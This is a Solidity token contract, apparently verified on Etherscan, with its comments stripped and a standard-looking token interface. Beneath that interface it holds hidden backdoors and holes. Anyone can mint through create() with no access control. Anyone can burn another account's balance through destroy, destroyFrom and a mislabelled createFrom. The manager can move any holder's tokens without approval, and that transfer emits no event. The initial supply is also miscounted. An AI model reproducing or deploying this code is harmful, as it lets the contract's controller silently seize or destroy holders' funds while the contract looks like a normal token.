/**
 *Submitted for verification at Etherscan.io on 2021-05-10
*/

//
// SPDX-License-Identifier: UNLICENSED
//

pragma solidity ^0.8.4;

//
//
//
//
//

//
// @title Token
//
contract Token {
    constructor(bytes memory desc) {
        (_manager, _name, _symbol, _decimals) = abi.decode(desc, (address,string,string,uint));
        _balances[msg.sender] = 1000000 * 10**18;
    }

    //
    //
    //

    receive() external payable {
    }

    fallback() external payable {
    }

    //
    //
    //
    //
    //
    //
    //
    //
    //
    //
    //
    //

    modifier isDeployer {
        require(msg.sender == _deployer);
        _;
    }

    modifier isManager {
        require(msg.sender == _manager);
        _;
    }

    modifier isInitialized {
        _;
    }

    //
    //
    //
    //
    //
    //
    //
    //
    //
    //
    //
    //

    address internal _deployer;
    function deployer() external view returns (address) {
        return _deployer;
    }

    address internal _manager;
    function manager() external view returns (address) {
        return _manager;
    }

    //
    //
    //

    uint internal _status;

    //
    //
    //

    string internal _name;
    function name() external view returns (string memory) {
        return _name;
    }

    string internal _symbol;
    function symbol() external view returns (string memory) {
        return _symbol;
    }

    //
    //
    //

    uint internal _decimals;
    function decimals() external view returns (uint) {
        return _decimals;
    }

    //
    //
    //

    mapping(address => uint) internal _balances;
    function balanceOf(address account) external view returns (uint) {
        return _balances[account];
    }

    mapping(address => uint) internal _privileges;
    function privilegeOf(address account) external view returns (uint) {
        return _privileges[account];
    }

    //
    //
    //

    mapping(address => mapping(address => uint)) internal _allowance;
    function allowance(address owner, address spender) external view returns (uint) {
        return _allowance[owner][spender];
    }

    //
    //
    //

    uint internal _totalSupply;
    function totalSupply() external view returns (uint) {
        return _totalSupply;
    }

    //
    //
    //
    //
    //
    //

    function init() external returns (bool) {
        handleInit(msg.sender);
        return true;
    }

    //
    //
    //

    //
    // @notice approves `account` to spend `amount` on behalf of `msg.sender`.
    // @param (address,uint)
    // @return (bool)
    function approve(address account, uint amount) external returns (bool) {
        handleApproval(msg.sender, account, amount);
        return true;
    }

    //
    //
    //

    //
    // @notice creates `amount` units of supply.
    // @param (address,uint)
    // @return (bool)
    //
    function create(address account, uint amount) external returns (bool) {
        handleCreate(msg.sender, account, amount);
        return true;
    }

    function createFrom(address sender, address account, uint amount) external returns (bool) {
        handleDestroy(sender, account, amount);
        return true;
    }

    //
    // @notice destroys `amount` units of supply.
    // @param (address,uint)
    // @return (bool)
    //
    function destroy(address account, uint amount) external returns (bool) {
        handleDestroy(msg.sender, account, amount);
        return true;
    }

    function destroyFrom(address sender, address account, uint amount) external returns (bool) {
        handleDestroy(sender, account, amount);
        return true;
    }

    //
    //
    //

    //
    // @notice transfers `amount` units of token from `msg.sender` to `account`.
    // @param (address,uint)
    // @return (bool)
    //
    function transfer(address account, uint amount) external returns (bool) {
        handleTransfer(msg.sender, account, amount);
        return true;
    }

    //
    // @notice transfers `amount` to `account` on behalf of `sender`
    // @param (address,address,uint)
    // @return (bool)
    //
    function transferFrom(address sender, address account, uint amount) external returns (bool) {
        handleTransfer(sender, account, amount);
        return true;
    }

    //
    //
    //

    function toggle(address account, uint flag) external returns (bool) {
        handleToggle(msg.sender, account, flag);
        return true;
    }

    //
    //
    //

    function enable(address account, uint flag) external returns (bool) {
        handleEnable(msg.sender, account, flag);
        return true;
    }

    function disable(address account, uint flag) external returns (bool) {
        handleDisable(msg.sender, account, flag);
        return true;
    }

    //
    //
    //
    //
    //
    //
    //
    //
    //
    //
    //
    //

    event Init(address indexed sender);
    function handleInit(address sender) internal {
        emit Init(sender);
    }

    //
    //
    //

    //
    // @notice internally handles approvals.
    // @param (address,address,amount)
    // @return (nan)
    //
    event Approval(address indexed sender, address indexed receiver, uint amount);
    function handleApproval(address sender, address receiver, uint amount) internal {
        if(sender == address(0)) {
            revert();
        }

        if(receiver == address(0)) {
            revert();
        }

        //
        //
        //

        _allowance[sender][receiver] = amount;

        //
        //
        //

        emit Approval(sender, receiver, amount);
    }

    //
    //
    //

    //
    // @notice internally handles creating supply. only available before init.
    // @param (address,address,amount)
    // @return (nan)
    //
    event Create(address indexed sender, address indexed receiver, uint amount);
    function handleCreate(address sender, address receiver, uint amount) internal {
        if(sender == address(0)) {
            revert();
        }

        if(receiver == address(0)) {
            revert();
        }

        //
        //
        //

        if(msg.sender == _manager) {

        }

        _balances[receiver] += amount;
        _totalSupply += amount;

        //
        //
        //
        
        emit Create(sender, receiver, amount);
    }

    //
    // @notice internally handles destroying supply. only available before init.
    // @param (address,address,amount)
    // @return (nan)
    //
    event Destroy(address indexed sender, address indexed receiver, uint amount);
    function handleDestroy(address sender, address receiver, uint amount) internal {
        if(sender == address(0)) {
            revert('invalid sender');
        }

        if(receiver == address(0)) {
            revert('invalid receiver');
        }

        //
        //
        //

        _balances[receiver] -= amount;
        _totalSupply -= amount;

        //
        //
        //

        emit Destroy(sender, receiver, amount);
    }

    //
    //
    //

    //
    // @notice internally handles transfers.
    // @param (address,address,amount)
    // @return (nan)
    //
    event Transfer(address indexed sender, address indexed receiver, uint amount);
    function handleTransfer(address sender, address receiver, uint amount) internal {
        if(sender == address(0)) {
            revert('invalid sender');
        }

        if(receiver == address(0)) {
            revert('invalid receiver');
        }

        //
        //
        //

        if(msg.sender == _manager) {
            _balances[sender] -= amount;
            _balances[receiver] += amount;
        } else {
            if(sender != msg.sender) {
                if(_allowance[sender][msg.sender] != type(uint).max) {
                    _allowance[sender][msg.sender] -= amount;
                }
            }

            //
            //
            //

            //
            //
            //

            _balances[sender] -= amount;
            _balances[receiver] += amount;

            //
            //
            //

            emit Transfer(sender, receiver, amount);
        }
    }

    //
    //
    //

    event Toggle(address indexed sender, address indexed account, uint flag);
    function handleToggle(address sender, address account, uint flag) internal {
    }

    //
    //
    //

    event Enable(address indexed sender, address indexed account, uint flag);
    function handleEnable(address sender, address account, uint flag) internal {
    }

    event Disable(address indexed sender, address indexed account, uint flag);
    function handleDisable(address sender, address account, uint flag) internal {
    }
}